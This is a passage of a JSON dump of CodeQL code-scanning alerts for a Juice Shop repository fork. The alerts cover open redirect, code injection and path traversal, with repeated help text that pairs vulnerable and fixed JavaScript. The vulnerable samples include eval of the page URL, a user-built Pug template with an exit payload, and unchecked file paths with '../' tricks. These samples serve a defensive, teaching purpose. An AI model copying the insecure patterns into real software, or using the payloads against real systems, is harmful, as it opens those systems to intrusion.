res.redirect(req.query[\"target\"]);\n});\n\n```\nOne way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:\n\n\n```javascript\nconst app = require(\"express\")();\n\nconst VALID_REDIRECT = \"http://cwe.mitre.org/data/definitions/601.html\";\n\napp.get(\"/redirect\", function (req, res) {\n  // GOOD: the request parameter is validated against a known fixed string\n  let target = req.query[\"target\"];\n  if (VALID_REDIRECT === target) {\n    res.redirect(target);\n  } else {\n    res.redirect(\"/\");\n  }\n});\n\n```\nAlternatively, we can check that the target URL does not redirect to a different host by parsing it relative to a base URL with a known host and verifying that the host stays the same:\n\n\n```javascript\nconst app = require(\"express\")();\n\nfunction isLocalUrl(path) {\n  try {\n    return (\n      // TODO: consider substituting your own domain for example.com\n      new URL(path, \"https://example.com\").origin === \"https://example.com\"\n    );\n  } catch (e) {\n    return false;\n  }\n}\n\napp.get(\"/redirect\", function (req, res) {\n  // GOOD: check that we don't redirect to a different host\n  let target = req.query[\"target\"];\n  if (isLocalUrl(target)) {\n    res.redirect(target);\n  } else {\n    res.redirect(\"/\");\n  }\n});\n\n```\nNote that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.\n\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Untrusted URL redirection depends on a user-provided value."},"location":{"path":"routes/redirect.ts","start_line":19,"end_line":19,"start_column":20,"end_column":25},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/64/instances","dismissal_approved_by":null},{"number":63,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/63","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/63","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/code-injection","severity":"error","description":"Code injection","name":"js/code-injection","tags":["external/cwe/cwe-079","external/cwe/cwe-094","external/cwe/cwe-095","external/cwe/cwe-116","security"],"full_description":"Interpreting unsanitized user input as code allows a malicious user arbitrary code execution.","help":"# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.\n\n\n## Recommendation\nAvoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.\n\n\n```javascript\neval(document.location.href.substring(document.location.href.indexOf(\"default=\")+8))\n\n```\nThe following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello `+ input\n    var fn = pug.compile(template);\n    var html = fn();\n    res.send(html);\n})\n\n```\nBelow is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello #{username}`\n    var fn = pug.compile(template);\n    var html = fn({username: input});\n    res.send(html);\n})\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This code execution depends on a user-provided value.\nThis code execution depends on a user-provided value."},"location":{"path":"routes/trackOrder.ts","start_line":17,"end_line":17,"start_column":40,"end_column":66},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/63/instances","dismissal_approved_by":null},{"number":62,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/62","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/62","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/code-injection","severity":"error","description":"Code injection","name":"js/code-injection","tags":["external/cwe/cwe-079","external/cwe/cwe-094","external/cwe/cwe-095","external/cwe/cwe-116","security"],"full_description":"Interpreting unsanitized user input as code allows a malicious user arbitrary code execution.","help":"# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.\n\n\n## Recommendation\nAvoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.\n\n\n```javascript\neval(document.location.href.substring(document.location.href.indexOf(\"default=\")+8))\n\n```\nThe following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello `+ input\n    var fn = pug.compile(template);\n    var html = fn();\n    res.send(html);\n})\n\n```\nBelow is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello #{username}`\n    var fn = pug.compile(template);\n    var html = fn({username: input});\n    res.send(html);\n})\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This code execution depends on a user-provided value."},"location":{"path":"routes/showProductReviews.ts","start_line":34,"end_line":34,"start_column":41,"end_column":64},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/62/instances","dismissal_approved_by":null},{"number":61,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/61","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/61","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/vulnCodeSnippet.ts","start_line":94,"end_line":94,"start_column":60,"end_column":106},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/61/instances","dismissal_approved_by":null},{"number":60,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/60","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/60","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/vulnCodeSnippet.ts","start_line":93,"end_line":93,"start_column":21,"end_column":67},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/60/instances","dismissal_approved_by":null},{"number":59,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/59","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/59","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/vulnCodeFixes.ts","start_line":80,"end_line":80,"start_column":62,"end_column":108},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/59/instances","dismissal_approved_by":null},{"number":58,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/58","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/58","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This path depends on a user-provided value."},"location":{"path":"routes/vulnCodeFixes.ts","start_line":79,"end_line":79,"start_column":23,"end_column":69},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/58/instances","dismissal_approved_by":null},{"number":57,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/57","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/57","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/path-injection","severity":"error","description":"Uncontrolled data used in path expression","name":"js/path-injection","tags":["external/cwe/cwe-022","external/cwe/cwe-023","external/cwe/cwe-036","external/cwe/cwe-073","external/cwe/cwe-099","security"],"full_description":"Accessing paths influenced by users can allow an attacker to access unexpected resources.","help":"# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: 